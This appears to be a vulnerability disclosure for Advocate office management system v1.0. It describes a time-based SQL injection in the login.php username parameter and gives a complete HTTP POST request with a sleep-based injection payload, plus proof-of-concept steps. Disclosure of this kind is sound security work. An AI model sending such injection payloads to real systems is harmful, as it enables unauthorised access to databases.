# Advocate office management system login.php time-based SQL Injection Vulnerability

* **Exploit Title**: Advocate office management system login.php time-based SQL Injection Vulnerability
* **Exploit Author**: webraybtl@webray.com.cn inc
* **Vendor Homepage**: https://www.sourcecodester.com/php/17280/advocate-office-management-system-free-download.html[](https://www.sourcecodester.com/download-code?nid=17280&title=Advocate+office+management+system+free+download)
* **Software Link**: https://www.sourcecodester.com/download-code?nid=17280&title=Advocate+office+management+system+free+download
* **Version**: Advocate office management system v1.0
* **Tested on:**  PHP 7.4.33, OpenResty1.21.4.3-3-3-focal
* **CVE:**  Reported, waiting for CVE number.

## Description

Advocate office management system login.php `username`​ parameter has a time-based SQL injection Vulnerability.

#### Payload used

```
POST /control/login.php HTTP/1.1
Host: 192.168.56.128:8080
Referer: http://192.168.56.128:8080/control/login.php
Origin: http://192.168.56.128:8080
Cookie: PHPSESSID=c44ka87dik7dcvd007quilufp2
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------50827837581442896902132243
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Content-Length: 422

-----------------------------50827837581442896902132243
Content-Disposition: form-data; name="username"

mayuri.infospace@gmail.com'and sleep(3) -- '
-----------------------------50827837581442896902132243
Content-Disposition: form-data; name="password"

admin
-----------------------------50827837581442896902132243
Content-Disposition: form-data; name="login"

Login
-----------------------------50827837581442896902132243--
```

## Proof of Concept

* Visit the login page, fill in the email and password, click login to get the post

  Request package.
* Construct the post request package and send it to the login.php. Successfully saw that the response time was delayed by the specified number of seconds.

​![login](assets/login-20240923170718-nwmo6ev.gif)​

* Upon reviewing the source code, it was discovered that the `username`​ parameter was directly concatenated into the SQL statement.

​![image](assets/image-20240923170853-ia9dx3k.png)​
